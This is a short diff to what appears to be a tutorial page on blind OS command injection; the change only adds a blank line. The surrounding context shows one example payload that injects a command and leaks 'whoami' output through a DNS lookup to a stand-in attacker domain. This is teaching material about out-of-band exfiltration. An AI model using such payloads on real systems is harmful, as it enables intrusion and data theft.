@@ -33,6 +33,7 @@ Once we’ve confirmed blind OS command injection, we can exfiltrate the output 
 💡 The out-of-band channel provides an easy way to exfiltrate the output from injected commands:
 {% endhint %}
 
+
 ```bash
 & nslookup `whoami`.kgji2ohoyw.web-attacker.com &
 ```
